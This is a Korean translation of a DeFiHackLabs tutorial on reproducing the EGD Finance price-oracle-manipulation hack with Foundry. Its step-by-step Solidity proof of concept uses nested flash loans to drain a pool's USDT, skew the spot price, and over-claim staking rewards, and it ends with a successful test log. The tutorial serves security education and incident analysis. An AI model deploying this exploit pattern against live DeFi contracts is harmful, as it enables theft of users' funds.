# OnChain Transaction Debugging: 3. Write Your Own PoC (Price Oracle Manipulation)

저자: [▓▓▓▓▓▓](https://twitter.com/h0wsO1)

한국어 번역: [0xDanielH](https://twitter.com/holyhansss)

커뮤니티 [디스코드](https://discord.gg/Fjyngakf3h)

XREX 및 [WTF 아카데미](https://github.com/AmazingAng/WTF-Solidity#%E9%93%BE%E4%B8%8A%E5%A8%81%E8%83%81%E5%88%86%E6%9E%90)에 게시됩니다.

[01_Tools](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/01_tools/en)에서는 스마트 컨트랙트 트랜잭션 분석을 위한 다양한 도구를 사용하는 방법을 배웠습니다.

[02_Warm](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/academy/onchain_debug/02_warmup/en/readme.md)에서는 foundry를 사용하여 탈중앙화 거래소의 트랜잭션을 분석했습니다.

이 게시글에서는 오라클 악용을 이용한 해킹 사례를 분석합니다. 주요 함수 호출을 단계별로 살펴보고 foundry 프레임워크를 사용하여 공격을 함께 재현해 볼 것입니다. 

## 공격 재현이 도움이 되는 이유는 무엇인가요?

DeFiHackLabs는 web 3.0 보안을 장려하고자 합니다. 해킹이 발생했을 때 더 많은 사람들이 이를 분석하고 전반적인 보안에 기여할 수 있기를 바랍니다.

1. 우리는 사고 대응과 효율성을 개선합니다.
2. 화이트햇으로서 우리는 PoC를 작성하고 버그 바운티 능력을 향상시킵니다. 
3. Blue team이 머신 러닝 모델을 최적화하는데 도움을 줍니다. 즉, [Forta Network](https://forta.org/blog/how-fortas-predictive-ml-models-detect-attacks-before-exploitation/).
4. 사후 분석을 읽는 것보다 공격을 재현함으로써 훨씬 더 많은 것을 배울 수 있습니다.
5. 전반적인 solidity(태권도) 능력을 향상시킵니다.

 
### 트렌젝션을 재현하기 전에 알아야 할 몇 가지 사항

1. [DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs)에서 선별한 일반적인 공격 모드에 대한 이해.
2. 스마트 컨트랙트가 서로 상호작용하는 방식을 포함한 기본적인 DeFi 메커니즘에 대한 이해.

### DeFi Oracle 소개

현재 스마트 컨트랙트 상태 값은 자체적으로 업데이트할 수 없습니다. 컨트랙트 로직을 실행하기 위해 실행 중에 외부 데이터가 필요할 때가 있습니다. 이는 일반적으로 다음과 같은 방법으로 수행됩니다.

1. 외부 소유 계정(EOA)를 통해 해당 계정의 보유금(reserves)을 기준으로 가격을 계산할 수 있습니다.
2. 다른 사람 또는 본인이 유지 관리하는 오라클을 사용합니다. 주기적으로 업데이트되는 외부 데이터(예: 가격, 이자율 등)를 사용합니다.

* 예를 들어, 유니스왑 V2에서는 자산의 현재 가격을 제공하며, 이는 거래되는 자산의 상대 가격을 결정하고 거래를 체결하는 데 사용됩니다.
  
  * 그림에서 ETH 가격은 외부 데이터입니다. 스마트 컨트랙트는 유니스왑 V2에서 이를 가져옵니다.

    우리는 일반적인 AMM에서의 `x * y = k` 공식을 알고 있습니다. 'x'(이더리움 가격) = 'k / y'입니다.
    이제 유니스왑 V2 WETH/USDC의 pair 컨트랙트를 살펴보겠습니다. 
    컨트랙트 주소:  `0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc`.

![UniV2PairInfo](https://user-images.githubusercontent.com/26408530/211231355-0d1fb43e-280e-4328-b71e-9797be5ce7ec.png)

* 글이 쓰여지는 지금 시점에는 보유금(reserves) 값은 다음과 같습니다:
  * WETH: `33,906.6145928`  USDC: `42,346,768.252804` 

  * 'x * y = k' 공식을 적용하면 각 이더리움의 가격이 산출됩니다:
     `42,346,768.252804 / 33,906.6145928 = 1248.9235`
     
   (Market prices may differ from the calculated price by a few cents. In most cases, this refers to a trading fee or a new transaction that affects the pool. This variance can be skimmed with `skim()`[^1].)
    (시장 가격은 공식을 통해 계산된 가격과 몇 센트 정도 다를 수 있습니다. 대부분의 경우 이는 거래 수수료 또는 풀에 영향을 미치는 새로운 트렌젝션을 의미합니다.)

    * Solidity Pseudocode: 대출 계약이 현재 이더리움 가격을 가져오기 위한 Pseudocode는 다음과 같을 수 있습니다:

```solidity
uint256 UniV2_ETH_Reserve = WETH.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 UniV2_USDC_Reserve = USDC.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 ETH_Price = UniV2_USDC_Reserve / UniV2_ETH_Reserve;
```
   > #### 이 계산 방식은 쉽게 조작할 수 있다는 점에 유의하세요. 프로덕션 코드에는 사용하지 마세요.

[^1]: Skim() :
Uniswap V2는 유동성 풀을 사용하여 자산을 거래하는 탈중앙화 거래소(DEX)입니다. Pair contract의 잔액을 변경할 수 있는 맞춤형 토큰 구현으로 발생할 수 있는 잠재적인 문제로부터 보호하기 위한 안전 조치로 `skim()` 함수가 있습니다. 하지만 `skim()`은 가격 조작에 사용될 수 있습니다.

skim()에 대한 자세한 설명은 그림을 참조하세요.
![截圖 2023-01-11 下午5 08 07](https://user-images.githubusercontent.com/107821372/211970534-67370756-d99e-4411-9a49-f8476a84bef1.png)
Image source / [Uniswap V2 Core whitepaper](https://uniswap.org/whitepaper.pdf)

* 자세한 내용은 아래 리소스를 참조하시기 바랍니다.
  * 유니스왑 V2 AMM 메커니즘: [스마트 컨트랙트 프로그래머](https://www.youtube.com/watch?v=Ar4Ik7Bov0U).
  * Oracle manipulation: [WTFSolidity](https://github.com/WTFAcademy/WTF-Solidity/blob/main/S15_OracleManipulation/readme.md).

### 오라클 가격 조작 공격(Oracle Price Manipulation Attack Modes) 

가장 일반적인 공격:

1. 오라클 주소 변경
    * 원인: 검증 메커니즘 부족
    * 예시: [Rikkei Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220415-rikkei-finance---access-control--price-oracle-manipulation)
2. 공격자는 flash loans을 통해 유동성을 고갈시켜 오라클에 잘못된 가격 정보를 생성할 수 있습니다.
    * 공격자가 다음과 같은 함수를 호출할 때 가장 자주 볼 수 있습니다. GetPrice、Swap、StackingReward, Transfer(with burn fee) 등이 있습니다.
    * 원인: 안전하지 않거나 손상된 오라클을 사용하는 프로토콜 또는 오라클이 시간 가중 평균 가격(time-weighted average price) 기능을 구현하지 않은 경우.
    * 예시: [One Ring Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220321-onering-finance---flashloan--price-oracle-manipulation)

    > Pro-tip-case 2: 코드 검토 시 `balanceOf()` 함수가 잘 보호되고 있는지 확인하세요.
---
## 단계별 PoC - EGD Finance 사례

### 1단계: 정보 수집

* 공격이 발견되면 최고의 DeFi 애널리스트들이 트위터에 새로운 공격에 대한 분석을 지속적으로 게시합니다.

> Pro tip: [DeFiHackLabs Discord](https://discord.gg/Fjyngakf3h) security-alert channel을 통해 최고의 DeFi 애널리스트가 선별한 업데이트를 받아보세요!

* Upon an attack incident, it is important to gather and organize the newest information. Here is a template!
* 공격 사고가 발생하면 최신 정보를 수집하고 정리하는 것이 중요합니다. 아래 템플을 활용하세요!
  1. 트렌젝션 ID (Transaction ID)
  2. 공격자 주소 (Attacker Address(EOA))
  3. 공격자 컨트랙트 주소 (Attack Contract Address)
  4. 취약한 컨트랙트 주소 (Vulnerable Address)
  5. 총 손실 (Total Loss)
  6. 참조 링크 (Reference Links)
  7. 사후 분석 링크 (Post-mortem Links)
  8. 취약한 code snippet (Vulnerable snippet)
  9. Audit 내역 (Audit History)

> Pro-tip: DeFiHackLabs의 [Exploit-Template.sol](/script/Exploit-template.sol) 템플릿을 사용하세요.

---
### 2단계: 트랜잭션 디버깅

경험에 따르면 공격 발생 후 12시간이 지나면 공격 분석의 90%가 완료됩니다. 일반적으로 이 시점에서 공격을 분석하는 것은 그리 어렵지 않습니다.

* 이해를 돕기 위해 실제 사례인 [EGD Finance Exploit attack](https://twitter.com/BlockSecTeam/status/1556483435388350464)을 예로 들어 설명하겠습니다:
    1. 오라클 조작의 위험성.
    2. 오라클 조작으로 이익을 얻는 방법.
    3. flash loans 트렌젝션.
    4. 공격자가 단 하나의 트랜잭션으로 공격을 성공시킨 방법.

* Blocksec의 [Phalcon](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3)을 사용하여 EGD Finance 사고를 분석해 보겠습니다.
<img width="1644" alt="Screenshot 2023-01-11 at 4 59 15 PM" src="https://user-images.githubusercontent.com/107821372/211762771-d2c54800-4595-4630-9392-30431094bfca.png">

* In Ethereum EVM, you will see 3 call types to trigger remote functions:
* 이더리움 EVM에서는 함수를 호출하는 3가지의 call 유형을 볼 수 있습니다:
    1. Call: 일반적인 교차 계약 함수 호출로, 수신자의 storage를 변경하는 경우가 많습니다.
    2. StaticCall: 수신자의 storage를 변경하지 않으며, 상태 및 변수를 가져오는 데 사용됩니다.
    3. DelegateCall: 일반적으로 proxy 호출에 사용되고, `msg.sender`의 storage를 동일하게 유지됩니다. 자세한 내용은 [WTF Solidity](https://github.com/WTFAcademy/WTF-Solidity/tree/main/23_Delegatecall)를 참고하세요.

> 이더리움 EVM에서는 내부 함수 호출[^2]이 보이지 않습니다.
[^2]: 내부 함수 호출은 새로운 트랜잭션이나 블록을 생성하지 않기 때문에 블록체인에 보이지 않습니다. 따라서 다른 스마트 컨트랙트가 읽거나 블록체인 트랜젝션 내역에 표시될 수 없습니다.
* 추가 정보 - 공격자의 Flash loan 공격 모드
  1. 공격이 수익성이 있는지 확인합니다. 먼저 대출을 받을 수 있는지 확인한 다음 공격 대상의 잔액이 충분한지 확인합니다.
        - 즉, 처음에는 'static calls'가 표시될 것입니다.
  2. Use DEX or Lending Protocols to obtain a flash loan, look for the following key function calls
  2. DEX 또는 Lending Protocols을 사용하여 flash loan을 받을 주요 함수를 찾습니다.
        - UniswapV2, Pancakeswap: `.swap()`
        - Balancer: `flashLoan()`
        - DODO: `.flashloan()`
        - AAVE: `.flashLoan()`
  3. flash loan 프로토콜에서 공격자의 컨트랙트로의 콜백은 다음과 같은 주요 함수 호출을 찾습니다.
        - UniswapV2: `.uniswapV2Call()`
        - Pancakeswap: `.Pancakeswap()`
        - Balancer: `.receiveFlashLoan()`
        - DODO: `.DXXFlashLoanCall()`
        - AAVE: `.executeOperation()`
   4. 공격을 실행하여 스마트 컨트랙트의 약점을 이용하여 이익을 얻습니다.
   5. flash loan 반환

### 연습: 

[Phalcon](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3)을 활용해 EGD Finance 취약점 공격의 다양한 단계를 식별합니다. 보다 구체적으로 ‘flashloan‘, ’callback‘, ’weakness‘, and ’profit’.

`Expand Level: 3`
<img width="1898" alt="TryToDecodeFromYourEyes" src="https://user-images.githubusercontent.com/26408530/211231441-b5cd2cd8-a438-4344-b014-6b8e92ab2532.png">

>Pro-tip: 개별 함수 호출의 로직을 이해할 수 없는 경우, 전체 호출 스택을 순차적으로 추적하면서 메모하고 자금 흐름에 특히 주의를 기울여 보세요. 이 작업을 몇 번 반복하면 훨씬 더 이해기 수월 할 것 입니다. 

<details><summary>정답</summary>

<img width="1589" alt="Screenshot 2023-01-12 at 1 58 02 PM" src="https://user-images.githubusercontent.com/107821372/211996295-063f4c64-957a-4896-8736-c4dbbc082272.png">

</details>


### 3단계: 코드 재현
공격 트랜잭션 함수 호출을 분석한 후 이제 몇 가지 코드를 재현해 보겠습니다.

#### Step A. Complete fixtures
<details><summary>코드를 표시하려면 클릭하세요</summary>
 
```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~36,044 US$
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776

// Declaring a global variable must be of constant type.
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract Attacker is Test { // simulated attacker(EOA)
    Exploit exploit = new Exploit();

    constructor() { // can also be replaced with ‘function setUp() public {}
        // Labels can be used to tag wallet addresses, making them more readable when using the 'forge test -vvvv' command."
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //Note: The attack transaction must be forked from the previous block, as the victim contract state has not yet been modified at this time.
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
}
```
</details>
<br>

#### Step B. harvest 함수를 호출하는 공격자 시뮬레이션
<details><summary>코드를 표시하려면 클릭하세요</summary>

```solidity=
contract Attacker is Test { // simulated attacker(EOA)
    Exploit exploit = new Exploit();

    constructor() {
        // Labels can be used to tag wallet addresses, making them more readable when using the 'forge test -vvvv' command.
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //The attack transaction must be forked from the previous block, as the victim contract state has not yet been modified at this time.
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
 
    function testExploit() public { // To be executed by Foundry testcases, it must be named "test" at the start.
        //To observe the changes in the balance, print out the balance first, before attacking.
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);
        
        console.log("Attacker manipulating price oracle of EGD Finance...");
        exploit.harvest(); //A simulation of an EOA call attack
        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
}
```
</details>
<br>

#### Step C. 공격 contract의 부분 완성
<details><summary>코드를 표시하려면 클릭하세요</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;

    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //獲利了結
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        // Weakness exploit...

        // Exchange the stolen EGD Token for USDT
        console.log("Swap the profit...");
        address[] memory path = new address[](2);
        path[0] = egd;
        path[1] = usdt;
        IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(egd).balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp
        );

        bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //Attacker repays 2,000 USDT + 0.5% service fee
        require(suc, "Flashloan[1] payback failed");
    }
}
```

</details>
<br>


### Step 4: 취약점 분석

공격자가 이 취약점을 이용하기 위해 `Pancakeswap.swap()` 함수를 호출한 것을 볼 수 있으며, 호출 스택에 두 번째 flash loan 호출이 있는 것처럼 보입니다.
![Flashloan2](https://user-images.githubusercontent.com/26408530/211231489-4977bc1d-4ed0-45f8-b014-8de92942fe4f.png)

* 팬케이크스왑은 `.pancakeCall()` 인터페이스를 사용하여 공격자의 컨트랙트에 대한 콜백을 수행합니다. 공격자가 두 콜백 각각에서 어떻게 다른 코드를 실행하는지 궁금할 것이라고 생각합니다.

핵심은 첫 번째 flash loan에서 공격자가 콜백 데이터에 '0x0000'을 사용했다는 점입니다.
![FlashloanCallbackData1](https://user-images.githubusercontent.com/26408530/211231501-7b8e508a-a6fe-4f28-9308-5406d0dec32f.png)

그러나 두 번째 flash loan에서는 공격자는 콜백 데이터에 '0x00'을 사용했습니다.
![FlashloanCallbackData2](https://user-images.githubusercontent.com/26408530/211231506-e76cc110-3969-486d-b917-7ddec3d46ee5.png)

이 방법을 통해 공격하는 컨트랙트는 `_data` 매개 변수를 기반으로 실행할 코드를 결정할 수 있습니다. 실행 할 코드는 `0x0000` 또는 `0x00`이 될 수 있습니다.

* flash loan 중 두 번째 콜백 로직을 계속 분석해 보겠습니다.

두 번째 콜백에서 공격자는 EGD Finance에서 `claimAllReward()`만 호출했습니다:

![CallClaimReward](https://user-images.githubusercontent.com/26408530/211231522-a54ef929-63e3-4b9c-8f0c-e609c2055b2c.png)

`claimAllReward()` 호출 스택을 더 확장시켜본다면, EGD Finance가 `0xa361-Cake-LP`에서 EGD 토큰과 USDT의 잔액을 읽은 후 공격자의 컨트랙트로 대량의 EGD 토큰을 전송한 것을 확인할 수 있습니다.

![ClaimRewardDetail](https://user-images.githubusercontent.com/26408530/211231532-d9b0e7ce-ee65-48fb-a2eb-6fccbb799234.png)

<details><summary>'0xa361-Cake-LP' contract가 무엇인가?</summary>

우리는 이더스캔을 활용해 `0xa361-Cake-LP`가 어떤 토큰 pair에 해당하는지 확인할 수 있습니다.

* Option 1(더 빠름)： [Etherscan](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d) 에서 컨트렉트가 가장 많이 가지고 있는 토큰을 확인합니다. 

![Etherscan-Top2](https://user-images.githubusercontent.com/26408530/211231654-613672c0-400d-4e53-891c-4c309d8ce84c.png)

* Option 2(더 정확함)：[Read Contract](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d#readContract)를 통해 token0과 token1의 주소를 확인합니다.

<img width="404" alt="Etherscan-ReadContract" src="https://user-images.githubusercontent.com/26408530/211231545-43777f4e-6433-4dba-b2dc-ab54cd7aaeed.png">

이는 `0xa361-Cake-LP`가 EGD/USDT 거래 pair 컨트랙트임을 나타냅니다。

</details>
<br>

* 이제 'claimAllReward()` 함수를 분석하여 취약점이 어디에 있는지 확인해 보겠습니다.
<img width="1518" alt="ClaimRewardCode" src="https://user-images.githubusercontent.com/26408530/211231553-770e01d9-d809-43e1-99df-8674b0b30c8c.png">

스테이킹 보상 금액은 보상 `quota`(스테이킹 금액 및 스테이킹 기간을 의미)에 현재 EGD 토큰 가격인 `getEGDPrice()`를 곱한 값에 따라 결정되는 것을 알 수 있습니다.

**즉, EGD 스테이킹 보상은 EGD 토큰의 가격을 기준으로 합니다. EGD 토큰 가격이 높을수록 더 적은 보상이 지급되며, 그 반대의 경우도 마찬가지입니다.**

* 이제 `getEGDPrice()` 함수가 EGD 토큰의 현재 가격을 어떻게 가져오는지 확인해 보겠습니다:

<img width="529" alt="getEGDPrice" src="https://user-images.githubusercontent.com/26408530/211231565-596b32d8-cbb9-4f59-a53e-77d837d2766c.png">

앞서 디파이 오라클 소개 섹션에서 소개한 것과 같은 방정식 `x * y = k`를 사용해 현재 가격을 구할 수 있습니다. 거래가 일어나는 `pair`의 주소는 트랜잭션 뷰에서 두 개의 STATICCALL과 일치하는 `0xa361-Cake-LP`입니다.

![getEGDPrice_Static](https://user-images.githubusercontent.com/26408530/211231574-bb7a652d-3538-4ca1-859d-a30962014d44.png)

그렇다면 공격자는 현재 가격을 받아오는 이 불안전한 함수를 어떻게 활용하고 있을까요?

기본 메커니즘은 두 번째 플래시 대출에서 공격자가 많은 양의 USDT를 빌렸기 때문에 `x * y = k` 공식에 따라 pool의 가격에 영향을 미치는 것입니다. 즉, 대출을 반환하기 전에는 `getEGDPrice()`가 올바르지 않을 것입니다.

Reference diagram:
![CleanShot 2023-01-12 at 17 01 46@2x](https://user-images.githubusercontent.com/107821372/212027306-3a7f9a8c-4995-472c-a8c7-39e5911b531d.png)
**결론:  공격자는 flash loan을 사용하여 EGD/USDT pair의 유동성을 순간적으로 변경했고, 그 결과 `ClaimReward()`이 잘못된 가격을 가져와 공격자가 더 많은 양의 EGD 토큰을 획득할 수 있었습니다.**

마지막으로, 공격자는 Pancakeswap을 사용하여 EGD 토큰을 USDT로 교환하여 공격으로부터 이익을 얻었습니다.

---
### Step 5: 공격 재현
이제 공격에 대해 완전히 이해했으니 공격을 재현해 보도록 하겠습니다.

Step D. 공격에 대한 PoC 코드 작성

<details><summary>코드를 표시하려면 클릭하세요</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Profit realization
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // 漏洞利用結束, 把盜取的 EGD Token 換成 USDT
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            // Exploitation...
        }


    }
}
```

</details>
<br>



Step E. 취약점을 사용하여 두 번째 flash loan에 대한 PoC 코드를 작성합니다.

<details><summary>코드를 표시하려면 클릭하세요</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Gaining profit
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // Exchange the stolen EGD Token for USDT after the exploit is over.
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            // -----------------------------------------------------------------
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            uint256 swapfee = amount1 * 3 / 1000;   // Attacker pay 0.3% fee to Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1+swapfee);
            require(suc, "Flashloan[2] payback failed");         
        }
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint);
}
```

</details>
<br>

Step F. 다음 명령어를 사용하여 코드를 실행시키고, balance의 변화를 확인해보세요.

```forge test --contracts ./src/test/EGD-Finance.exp.sol -vvv```

[DeFiHackLabs - EGD-Finance.exp.sol](https://github.com/finn79426/DeFiHackLabs/blob/main/src/test/EGD-Finance.exp.sol)

```
Running 1 test for src/test/EGD-Finance.exp.sol:Attacker
[PASS] testExploit() (gas: 537204)
Logs:
  --------------------  Pre-work, stake 10 USDT to EGD Finance --------------------
  Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8
  Attacker Stake 10 USDT to EGD Finance
  -------------------------------- Start Exploit ----------------------------------
  [Start] Attacker USDT Balance: 0.000000000000000000
  [INFO] EGD/USDT Price before price manipulation: 0.008096310933284567
  [INFO] Current earned reward (EGD token): 0.000341874999999972
  Attacker manipulating price oracle of EGD Finance...
  Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve
  Flashloan[1] received
  Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve
  Flashloan[2] received
  [INFO] EGD/USDT Price after price manipulation: 0.000000000060722331
  Claim all EGD Token reward from EGD Finance contract
  [INFO] Get reward (EGD token): 5630136.300267721935770000
  Flashloan[2] payback success
  Swap the profit...
  Flashloan[1] payback success
  -------------------------------- End Exploit ----------------------------------
  [End] Attacker USDT Balance: 18062.915446991996902763

Test result: ok. 1 passed; 0 failed; finished in 1.66s
```


Note: DeFiHackLabs의 EGD-Finance.exp.sol에는 스테이킹이라는 선제적 단계가 포함되어 있습니다.

이 글에는 이 단계가 포함되어 있지 않으니 직접 시도해 보세요! Attacker Stack Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

#### 세 번째 글은 여기서 마무리하며, 자세한 내용은 아래 링크를 참조하세요.

---
### Learning materials

[samczsun's eth txn explorer and vscode extension](https://www.youtube.com/watch?v=HXgu239mPBc)

[Vulnerabilities in DeFi by Daniel V.F.](https://www.youtube.com/watch?v=9fcOffCg2ig)

[Tenderly.co - Debug Transaction](https://www.youtube.com/watch?v=90GN9Ut8LhU)

[Reversing The EVM: Raw Calldata](https://degatchi.com/articles/reading-raw-evm-calldata)

[https://web3sec.xrex.io/](https://web3sec.xrex.io/)

---
### Appendix

